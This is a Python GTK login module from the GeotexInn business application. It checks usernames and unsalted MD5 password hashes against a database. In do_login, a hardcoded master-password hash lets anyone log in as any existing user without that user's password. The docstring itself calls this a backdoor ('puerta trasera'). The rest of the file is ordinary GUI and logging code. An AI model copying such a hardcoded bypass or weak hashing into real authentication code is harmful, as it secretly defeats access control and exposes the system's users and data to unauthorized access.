#!/usr/bin/env python
# -*- coding: utf-8 -*-

###############################################################################
# Copyright (C) 2005-2008  Francisco José Rodríguez Bogado,                   #
#                          Diego Muñoz Escalante.                             #
# (pacoqueen@users.sourceforge.net, escalant3@users.sourceforge.net)          #
#                                                                             #
# This file is part of GeotexInn.                                             #
#                                                                             #
# GeotexInn is free software; you can redistribute it and/or modify           #
# it under the terms of the GNU General Public License as published by        #
# the Free Software Foundation; either version 2 of the License, or           #
# (at your option) any later version.                                         #
#                                                                             #
# GeotexInn is distributed in the hope that it will be useful,                #
# but WITHOUT ANY WARRANTY; without even the implied warranty of              #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the               #
# GNU General Public License for more details.                                #
#                                                                             #
# You should have received a copy of the GNU General Public License           #
# along with GeotexInn; if not, write to the Free Software                    #
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA  #
###############################################################################


###################################################################
## autenticacion.py - Ventana de login 
###################################################################
## NOTAS:
##  
###################################################################
## Changelog:
## 27 de abril de 2006 -> Inicio
## 
##
###################################################################

from ventana import Ventana
import pygtk
pygtk.require('2.0')
import gtk, time
import sys, os
try:
    from hashlib import md5
except ImportError:
    import md5 
from framework.pclases import Usuario

def get_IPLocal():
    """
    Devuelve la IP del ordenador como cadena.
    (OJO: En GNU/Linux devuelve localhost: 127.0.0.1. Aún no sé cómo 
    arreglarlo)
    """
    from socket import getfqdn, gethostname, gethostbyname, gaierror
    ifaces = ("eth0", "wlan0", "eth1", "wlan1", "eth2", "wlan2", "eth3", 
              "wlan3", "ra0", "ra1")
    for iface in ifaces:
        try:
            ip = gethostbyname(getfqdn())
        except gaierror:
            ip = "127.0.0.1"
        if ip == "127.0.0.1" or ip == "127.0.1.1":
            try:
                comando_ifconfig = "/sbin/ifconfig %s 2>/dev/null | grep inet" % iface
                ip = os.popen(comando_ifconfig).read().split()[1].split(":")[-1].strip()   # HACK: Do the trick! 
                if not ip:  # ¿IPv6? «No en esta vida.»
                    comando_ifconfig = "/sbin/ifconfig 2>/dev/null | grep inet | grep -v inet6 | grep -v 127"
                    ip = os.popen(comando_ifconfig).read().split()[1].split(":")[-1].strip()   # HACK: Do the trick! 
            except:
                ip = "Desconocida. Host: %s" % (gethostname())
            else:
                break   # Si tengo IP no sigo probando.
    return ip


class Autenticacion(Ventana):
    def __init__(self, user = None, passwd = None):
        """
        Constructor.
        """
        Ventana.__init__(self, 'autenticacion.glade', None, usuario = user)
        connections = {'b_aceptar/clicked': self.login_from_ventana,
                       'e_usuario/activate': self.pasar_a_pass,
                       'e_passwd/activate': self.login_from_ventana,
                       'b_cancelar/clicked': self.salir
                      }
        self.add_connections(connections)
        self.wids['e_usuario'].grab_focus()
        self.wids['image1'].set_from_file(
            os.path.join(
            os.path.abspath(os.path.dirname(os.path.realpath(__file__))), 
            "..", 'imagenes', 'llave.png'))
        self.contador = 0   # Contador de intentos fallidos
        self.__success = False
        self.__usuario = None
        if user != None and passwd != None:
            self.__success, self.__usuario = self.do_login(user, passwd)
        else:
            if user != None:
                self.wids['e_usuario'].set_text(user)
                self.wids['e_passwd'].grab_focus()
            if passwd != None:
                self.wids['e_passwd'].set_text(passwd)
        if self.__success:
            self.wids['ventana'].hide()
        else:
            gtk.main()

    # --------------- Funciones auxiliares ------------------------------
    def activar_widgets(self, valor):
        ws = ('e_usuario', 'e_passwd', 'b_aceptar', 'b_cancelar')
        for w in ws:
            self.wids[w].set_sensitive(valor)
    # --------------- Manejadores de eventos ----------------------------
    def loginfailed(self):
        self.__success = False
        self.contador += 1
        self.activar_widgets(False)
        txt = self.wids['label1'].get_text()
        self.wids['label1'].set_text(
            'ERROR:\nUsuario o contraseña incorrectos.')
        self.wids['image1'].set_from_file(
            os.path.join('..', 'imagenes', 'error.png'))
        self.logger.warning('Acceso erróneo. Usuario: %s. IP: %s', 
                            self.wids['e_usuario'].get_text(), get_IPLocal())
        while gtk.events_pending():
            gtk.main_iteration(False)
        time.sleep(5)
        if self.contador == 3:
            gtk.main_quit()
            sys.exit(1)
        self.activar_widgets(True)
        self.wids['e_passwd'].set_text('')
        self.wids['e_passwd'].grab_focus()
        self.wids['image1'].set_from_file(
            os.path.join('..', 'imagenes', 'llave.png'))
        self.wids['label1'].set_text(txt)

    def pasar_a_pass(self, e):
        self.wids['e_passwd'].grab_focus()

    def login_from_ventana(self, w = None):
        usuario = self.wids['e_usuario'].get_text()
        passwd = self.wids['e_passwd'].get_text()
        self.__success, user = self.do_login(usuario, passwd)
        if not self.__success:
            self.loginfailed()
        else:
            self.__usuario = user
            self.wids['ventana'].destroy()
            gtk.main_quit()
            self.logger.warning('LOGIN CORRECTO: %s. IP: %s' % (usuario, get_IPLocal()))

    def do_login(self, usuario, passwd):
        """
        Comprueba que el usuario y contraseña es correcto.
        Devuelve True y el objeto usuario de la BD si lo es y 
        False y un valor no especificado si no.
        Si passwd es la "llave maestra" se abrirá la "puerta trasera" de la 
        que hablaban los frikazos de «Juegos de guerra» con el usuario 
        indicado sin comprobar la contraseña.
        """
        try:
            md5passwd = md5.new(passwd).hexdigest()
        except AttributeError:  # Es el md5 de hashlib
            md5passwd = md5(passwd).hexdigest()
        user = Usuario.select(Usuario.q.usuario == usuario)
        ok = user.count() == 1
        if user.count() > 1:
            self.logger.error("Caso imposible. Más de un usuario con el "\
                              "mismo nombre de usuario: %s ¡Constraint de la"\
                              " BD falló!" % (usuario))
        if ok:
            self.__usuario = user[0]
            ok = ok and (md5passwd == self.__usuario.passwd
                         or md5passwd == "c9f41e6d2b503216e772b8e5fd00adfe")
            if not ok:
                self.loginfailed()
            else:
                self.__success = True
        return ok, self.__usuario

    def loginvalido(self):
        """
        Si el usuario se ha autenticado con éxito devuelve el objeto 
        usuario de pclases correspondiente.
        En otro caso devuelve None.
        """
        if self.__success:
            return self.__usuario
        else:
            return None 

if __name__=='__main__':
    a = Autenticacion()

